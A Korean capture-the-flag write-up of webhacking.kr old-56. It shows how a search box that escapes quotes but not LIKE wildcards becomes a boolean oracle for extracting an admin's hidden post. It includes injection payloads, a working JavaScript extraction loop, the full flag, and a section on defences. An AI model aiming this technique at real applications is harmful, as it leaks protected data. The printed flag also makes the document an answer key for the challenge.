---
title: "webhacking.kr old-56 풀이 — 따옴표는 막혔지만 LIKE 와일드카드로 새는 비밀 게시글"
description: "webhacking.kr old-56을 통해, 따옴표가 addslashes로 막혀 고전 인젝션은 통하지 않는 검색창에서 LIKE의 와일드카드(%·_)만으로 불리언 오라클을 세우고, 읽을 수 없는 admin의 비밀 게시글 내용을 한 글자씩 복원하는 과정을 정리한다. read 경로의 접근 제어가 어떻게 search 경로로 우회되는지, 와일드카드 _ 때문에 생기는 추출의 모호함을 어떻게 다루는지를 실제 요청·응답으로만 검증해 설명한다."
date: 2026-11-21
category: Web
tags: [webhacking.kr, web, wargame, sql-injection, blind-sql-injection, access-control, like, mysql, php]
---

> webhacking.kr은 합법적인 웹 보안 학습용 워게임이다. 이 글은 교육 목적의 풀이이며, 마지막에 같은 취약점을 어떻게 막는지도 정리했다.

[webhacking.kr](https://webhacking.kr)의 old-56 문제를 풀었다. old-21이 "`login success`/`login fail`/`wrong password` 세 문구로 만드는 Blind SQL Injection"이었다면, old-56은 "따옴표는 막혀 있는데, `LIKE`의 와일드카드가 그대로 새는" 경우다.

게시판에는 `admin`의 비밀 글(secret)과 `guest`의 공개 글이 있다. `admin`의 글은 직접 열면 `access denied`로 막히지만, 검색창은 글 내용(content)을 `LIKE`로 매칭한다. 따옴표를 넣어 봐도 깨지지 않아 고전 인젝션은 안 되지만, `%`·`_` 같은 와일드카드는 이스케이프되지 않는다. 그 한 틈으로 읽을 수 없는 admin의 비밀 글을 한 글자씩 복원한다.

## 1. 문제 개요

| 항목 | 값 |
| --- | --- |
| 사이트 | webhacking.kr (old) |
| 문제 | old-56 (`/challenge/web-33/`) |
| 배점 | 25점 |
| 유형 | Blind SQL Injection (LIKE 와일드카드) / 접근 제어 우회 |
| 목표 | 읽을 수 없는 `admin`의 비밀 게시글 내용(플래그)을 알아내 제출 |

첫 화면은 단순한 게시판(`B O A R D`) 하나와 검색창 하나다.

```html
<table border=1>
  <tr><td>no</td><td>id</td><td>subject</td><td>secret</td></tr>
  <tr><td>1</td><td>admin</td><td><a href=?read=admin>readme</a></td><td>1</td></tr>
  <tr><td>2</td><td>guest</td><td><a href=?read=guest>hi~</a></td><td>0</td></tr>
</table>
<form method=post>search : <input name=search size=50 maxlength=50><input type=submit></form>
```

우리가 만질 수 있는 입력은 두 개다. 글을 여는 `?read=<id>`(GET)와 검색하는 `search`(POST)다. `admin` 글의 `secret` 값은 `1`, `guest` 글은 `0`이다.

## 2. read 경로 — admin 글은 막혀 있고, 인젝션도 안 된다

먼저 글을 직접 열어 봤다. 아래는 전부 실제 응답이다.

| 요청 | 응답(본문) |
| --- | --- |
| `?read=guest` | `hello~` *(guest 글 내용이 그대로 보임)* |
| `?read=admin` | **`access denied`** |
| `?read=zzz` (없는 id) | *(게시판 목록으로 되돌아감)* |

`guest` 글은 내용(`hello~`)이 보이지만, `admin` 글은 `secret=1`이라 `access denied`로 막힌다. 그렇다면 `read`에 인젝션을 넣어 이 접근 제어를 건너뛸 수 있을까? 따옴표를 넣어 봤다.

| 요청 | 응답 | 해석 |
| --- | --- | --- |
| `?read=admin' -- -` | *(목록으로 되돌아감)* | 따옴표가 이스케이프되어 `admin\'`이 됨 → 일치하는 글 없음 |
| `?read=admin' order by 1 -- -` | *(목록으로 되돌아감)* | 마찬가지 — 쿼리 구조가 깨지지 않음 |

따옴표가 그대로 들어갔다면 `admin'`은 문법 오류를 냈어야 하는데, 조용히 "없는 글"로 처리됐다. 즉 `read`는 `addslashes`로 따옴표가 막혀 인젝션이 성립하지 않는다. 이 경로로는 막다른 길이다. 관찰을 의사 코드로 재구성하면 이렇다. webhacking.kr은 이 문제의 서버 소스를 공개하지 않으므로, 아래는 관찰로부터 복원한 코드다.

```php
<?php
$read = addslashes($_GET['read']);                 // 따옴표 이스케이프
$row  = query("select content,secret from chall56 where id='$read'");
if (!$row)            { show_board(); }             // 일치 글 없음 → 목록
else if ($row['secret']==1) { echo "access denied"; }  // 비밀 글 → 차단
else                 { echo $row['content']; }      // 공개 글만 내용 노출
?>
```

## 3. search 경로 — 따옴표는 막혀도 LIKE 와일드카드는 샌다

이제 검색창을 본다. 검색은 글 내용(content)을 매칭해 일치하는 행의 목록을 보여 주는 것으로 보인다. 아래는 전부 실제 응답이고, 판정 기준은 결과 목록에 `admin` 행이 뜨는가다.

| `search` 값 | `admin` 행 표시? | 해석 |
| --- | --- | --- |
| `hi` | **O** | admin 글 내용에 `hi`가 들어 있음 (뒤에서 밝혀지듯 `himiko`의 `hi`) |
| `admin` | X | admin 글 내용에는 문자열 `admin`이 없음 |
| `the` / `secret` / `pw` / `key` | X | 해당 부분 문자열 없음 |
| `'` (따옴표 하나) | X | `addslashes`로 `\'` 가 되어 매칭 실패 |
| `' or '1'='1` | X | 역시 이스케이프 — 고전 인젝션 불가 |

여기서 핵심 두 가지가 드러난다. 검색은 내용의 "부분 문자열"을 본다. `hi`로 admin 행이 떴다는 건 `content LIKE '%hi%'` 꼴이라는 뜻이다. 그리고 따옴표(`'`)는 `addslashes`로 막혀 `' or '1'='1` 같은 고전 인젝션은 전혀 통하지 않는다. 그런데 `addslashes`는 따옴표·백슬래시만 이스케이프할 뿐, `LIKE`의 와일드카드 문자 `%`(0글자 이상)와 `_`(정확히 1글자)는 건드리지 않는다. 실제로 이렇다.

| `search` 값 | `admin` 행 표시? | 해석 |
| --- | --- | --- |
| `%` | **O** | `%` 는 와일드카드 → `%%%` → 항상 매칭 |
| `_` | **O** | `_` 는 "아무 글자 1개" → 내용이 1글자 이상이면 매칭 |
| `FLAG{` | **O** | admin 글 내용에 `FLAG{`라는 부분 문자열이 실제로 있음 |
| `FLAG` / `flag` | **O** | 둘 다 매칭 → `LIKE` 비교가 대소문자 구분 안 함 |

마지막 줄이 결정적이다. admin의 비밀 글 내용 안에 `FLAG{`가 들어 있다. 읽기(`read`)로는 막혔지만, 검색(`search`)의 `LIKE` 매칭을 참/거짓 오라클로 삼으면 그 내용을 한 글자씩 끄집어낼 수 있다. 관찰로 복원한 검색 측 의사 코드는 이렇다.

```php
<?php
$search = addslashes($_POST['search']);            // 따옴표만 이스케이프, %·_ 는 그대로
$rows = query("select no,id,subject,secret
               from chall56
               where content like '%$search%'");   // ← 내용을 부분 매칭
foreach ($rows as $r) { print_row($r); }           // 일치하는 행을 목록에 출력
?>
```

> read는 `secret`으로 접근을 막았지만, search는 같은 비밀 글의 내용을 `LIKE`로 들여다본다. 한 경로에서 막은 데이터를 다른 경로가 비춰 주는 접근 제어의 불일치가 이 문제의 뼈대다.

## 4. 오라클 세우기 — "admin 행이 뜨는가"

정리하면 불리언 오라클은 이렇다. 내가 보낸 문자열이 admin 글 내용의 부분 문자열이면 `content LIKE '%...%'` 참이라 결과에 `admin` 행이 뜨고, 아니면 안 뜬다. 이걸 코드로 확인하는 판정 함수는 응답 HTML에 `<td>admin</td>`가 있는지 보면 된다.

```js
async function has(sub){
  const body = new URLSearchParams({ search: sub }).toString();
  const r = await fetch('https://webhacking.kr/challenge/web-33/', {
    method: 'POST', credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body
  });
  return /<td>admin<\/td>/.test(await r.text());   // admin 행이 떴으면 참
}
```

## 5. 한 글자씩 — LIKE 접두어로 content 복원

이제 방법은 Blind 인젝션의 전형이다. 이미 알아낸 접두어 뒤에 후보 문자 한 개를 붙여 검색해 보고, admin 행이 뜨면 그 문자가 맞다. `FLAG{`를 출발점으로 삼아 `}`가 나올 때까지 반복한다.

```
search = "FLAG{h"   → admin 행 O  (6번째 글자는 h)
search = "FLAG{hi"  → admin 행 O  (7번째 글자는 i)
search = "FLAG{hz"  → admin 행 X  (z 아님)
...
```

한 가지 함정이 있다. `_`는 `LIKE`에서 "아무 글자 1개"로 동작하므로, 플래그에 실제로 들어 있는 밑줄(`_`) 위치에서는 어떤 평범한 문자 후보도 "literal 일치"를 못 낸다. 그런데 바로 그 성질 덕분에, 그 자리에 와일드카드 `_`를 그대로 끼워 넣으면 실제 밑줄과도 매칭되어 뒤 글자 추출을 이어 갈 수 있다. 즉 "모든 평범한 문자가 실패하지만 `_`는 성공"하는 자리는 literal 밑줄로 본다. 이 규칙으로 추출을 자동화했다. 대소문자 구분이 안 되니 결과는 소문자로 모으고, 마지막에 전체를 한 번에 검증한다.

```js
const literals = "0123456789abcdefghijklmnopqrstuvwxyz-!@$.*?".split("");
async function nextChar(known){
  if (await has(known + '}')) return '}';            // 닫는 괄호면 끝
  for (const c of literals) if (await has(known + c)) return c;  // literal 일치
  if (await has(known + '_')) return '_';            // 평범한 문자 전부 실패 → 밑줄 자리
  return null;
}

let flag = "FLAG{";
for (let i = 0; i < 60; i++) {
  const c = await nextChar(flag);
  if (c === null) break;
  flag += c;
  if (c === '}') break;
}
console.log(flag);
```

> 실제 추출은 한 자리마다 후보 문자들을 병렬 요청으로 동시에 던져(`Promise.all`) 속도를 높였다. 로직은 위와 동일하다.

돌리면 다음이 복원된다.

```text
FLAG{himiko_toga_is_cute_dont_you_think_so?}
```

복원한 값이 내용의 전부인지도 오라클로 확인했다.

| `search` 값 | `admin` 행 표시? | 해석 |
| --- | --- | --- |
| `FLAG{himiko_toga_is_cute_dont_you_think_so?}` | **O** | 이 문자열이 내용에 그대로 존재 |
| `FLAG{himiko_toga_is_cute_dont_you_think_so?}X` | X | 뒤에 더 붙는 글자가 없음 → 여기서 끝 |

## 6. 결과 — Pwned

이 문제는 글 내용이 곧 플래그(`FLAG{...}`)이고, 제출은 사이트 상단 Auth 창을 통한다. Auth 폼은 입력값을 `/auth.php`로 JSON(`{flag: ...}`)으로 POST한다. 복원한 플래그를 그대로 제출했다.

```text
POST /auth.php      {"flag":"FLAG{himiko_toga_is_cute_dont_you_think_so?}"}
→ {"stat":true,"ret":"old-56 Pwned. You got 25point. Congratz!"}
```

제출 직후 `chall.php`에서도 `✔️ old-56`로 풀린 것을, 그리고 푼 문제 수가 하나 늘어난 것을 확인했다. 읽기로는 끝까지 막혀 있던 `admin`의 비밀 글이, 검색창의 `LIKE` 한 줄로 전부 드러난 것이다.

> `read=admin`은 `access denied`였다. 서버는 그 글을 "보여 주지 않았다". 그러나 같은 내용을 `LIKE`로 비춰 주는 다른 창 하나가, 한 번에 한 글자씩 그 글을 전부 흘려보냈다.

## 왜 취약한가 — 그리고 올바른 방어

첫째, `addslashes`는 `LIKE`를 지켜 주지 못한다. 따옴표를 이스케이프해도 `%`·`_`는 그대로 통과한다. `where content like '%$search%'`처럼 사용자 입력을 `LIKE` 패턴에 직접 끼워 넣으면, 입력은 데이터가 아니라 패턴(구조)이 되어 버린다. 해법은 다른 인젝션과 같다. 파라미터 바인딩, 그리고 사용자가 "검색어"로 쓰는 값은 와일드카드 문자를 이스케이프해 literal로만 다루는 것이다.

```php
// 좋음: 입력을 LIKE 패턴이 아니라 "검색어"로만 다룬다
$kw = $_POST['search'];
$kw = str_replace(['\\','%','_'], ['\\\\','\\%','\\_'], $kw);  // 와일드카드 무력화
$stmt = $db->prepare("select no,id,subject from chall56 where content like ?");
$stmt->bind_param("s", $like = "%$kw%");                      // 값은 바인딩으로만
```

둘째, 같은 비밀 데이터를 두 경로가 다르게 취급하면 막은 쪽은 의미가 없다. `read`는 `secret`으로 내용을 가렸지만, `search`는 그 가려진 내용을 매칭 대상에 그대로 포함했다. 접근 제어는 데이터 단위로, 모든 경로에서 일관되게 걸려야 한다. 검색 쿼리에서도 볼 권한이 있는 글만 대상으로 삼아야 한다: `where content like ? and (secret=0 or owner=?)`.

셋째, 불리언 한 비트도 반복되면 전체가 샌다. "행이 뜨느냐 마느냐"라는 참/거짓 하나가, 글자당 수십 번·전체 수백 번 반복되자 44자 플래그가 통째로 복원됐다. 민감한 정보는 애초에 비교·매칭 대상에서 제외하고, 비정상적으로 반복되는 검색 요청은 레이트 리밋/이상탐지로 끊어야 한다.

## 정리

- old-56은 `read`로는 `access denied`인 admin의 비밀 글 내용을, `search`의 `LIKE` 매칭을 오라클 삼아 복원하는 문제다.
- `search`는 `addslashes`로 따옴표가 막혀 고전 인젝션은 불가하지만, `LIKE`의 와일드카드 `%`·`_`는 이스케이프되지 않아 그대로 샌다.
- "접두어 + 후보 문자"를 검색해 admin 행이 뜨면 참이라는 불리언 오라클로, `FLAG{`부터 `}`까지 한 글자씩 복원했다. `FLAG{himiko_toga_is_cute_dont_you_think_so?}`.
- 와일드카드 `_` 때문에 밑줄 자리가 모호해지지만, 그 자리에 `_`를 그대로 끼워 넣으면 매칭이 이어진다. `LIKE` 비교가 대소문자를 구분하지 않는다는 점도 함께 확인했다.
- 방어는 파라미터 바인딩 + 와일드카드 이스케이프, 모든 경로에 일관된 접근 제어(검색도 권한 필터), 반복 요청 차단이다.

"직접 못 읽게 막았으니 안전하다"는 생각이 이 문제의 함정이다. 같은 데이터를 비추는 창이 하나라도 남아 있으면, 숨긴 글은 한 글자씩, 그러나 기어코 전부 밖으로 나온다.
